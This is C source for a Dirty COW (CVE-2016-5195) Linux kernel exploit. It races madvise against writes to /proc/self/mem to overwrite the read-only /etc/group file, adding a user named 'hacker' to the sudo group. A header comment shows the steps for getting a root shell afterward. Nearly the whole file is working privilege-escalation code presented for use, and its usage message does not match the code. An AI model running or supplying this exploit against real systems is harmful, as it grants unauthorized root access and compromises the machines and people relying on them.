/*
####################### dirtyc0w.c #######################
$ cat /etc/group
$ ./dirtyc0w
$ sudo -i
####################### dirtyc0w.c #######################
*/
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>

void *map;
int f;
struct stat st;
char *name;
 
void *madviseThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int i,c=0;
  for(i=0;i<100000000;i++)
  {
/*
You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661
> This is achieved by racing the madvise(MADV_DONTNEED) system call
> while having the page of the executable mmapped in memory.
*/
    c+=madvise(map,100,MADV_DONTNEED);
  }
  printf("madvise %d\n\n",c);
}
 
void *procselfmemThread(void *arg)
{
  char *str;
  str="root:x:0:\ndaemon:x:1:\nbin:x:2:\nsys:x:3:\nadm:x:4:\ntty:x:5:\ndisk:x:6:\nlp:x:7:\nmail:x:8:\nnews:x:9:\nuucp:x:10:\nman:x:12:\nproxy:x:13:\nkmem:x:15:\ndialout:x:20:\nfax:x:21:\nvoice:x:22:\ncdrom:x:24:\nfloppy:x:25:\ntape:x:26:\nsudo:x:27:hacker\naudio:x:29:\ndip:x:30:\nwww-data:x:33:\nbackup:x:34:\noperator:x:37:\nlist:x:38:\nirc:x:39:\nsrc:x:40:\ngnats:x:41:\nshadow:x:42:\nutmp:x:43:\nvideo:x:44:\nsasl:x:45:\nplugdev:x:46:\nstaff:x:50:\ngames:x:60:\nusers:x:100:\nnogroup:x:65534:\ninput:x:101:\nsystemd-journal:x:102:\nsystemd-timesync:x:103:\nsystemd-network:x:104:\nsystemd-resolve:x:105:\nsystemd-bus-proxy:x:106:\nnginx:x:107:\nhacker:x:1000:\n\n";
/*
You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
>  The in the wild exploit we are aware of doesn't work on Red Hat
>  Enterprise Linux 5 and 6 out of the box because on one side of
>  the race it writes to /proc/self/mem, but /proc/self/mem is not
>  writable on Red Hat Enterprise Linux 5 and 6.
*/
  int f=open("/proc/self/mem",O_RDWR);
  int i,c=0;
  for(i=0;i<100000000;i++) {
/*
You have to reset the file pointer to the memory position.
*/
    lseek(f,(uintptr_t) map,SEEK_SET);
    c+=write(f,str,strlen(str));
  }
  printf("procselfmem %d\n\n", c);
}
 
 
int main(int argc,char *argv[])
{
  if (argc!=1) {
  (void)fprintf(stderr, "%s\n",
      "usage: dirtyc0w target_file new_content");
  return 1; }
  pthread_t pth1,pth2;
/*
You have to open the file in read only mode.
*/
  f=open("/etc/group",O_RDONLY);
  fstat(f,&st);
  name="/etc/group";
/*
You have to use MAP_PRIVATE for copy-on-write mapping.
> Create a private copy-on-write mapping.  Updates to the
> mapping are not visible to other processes mapping the same
> file, and are not carried through to the underlying file.  It
> is unspecified whether changes made to the file after the
> mmap() call are visible in the mapped region.
*/
/*
You have to open with PROT_READ.
*/
  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
  printf("mmap %zx\n\n",(uintptr_t) map);
/*
You have to do it on two threads.
*/
  pthread_create(&pth1,NULL,madviseThread,name);
  pthread_create(&pth2,NULL,procselfmemThread,NULL);
/*
You have to wait for the threads to finish.
*/
  pthread_join(pth1,NULL);
  pthread_join(pth2,NULL);
  return 0;
}
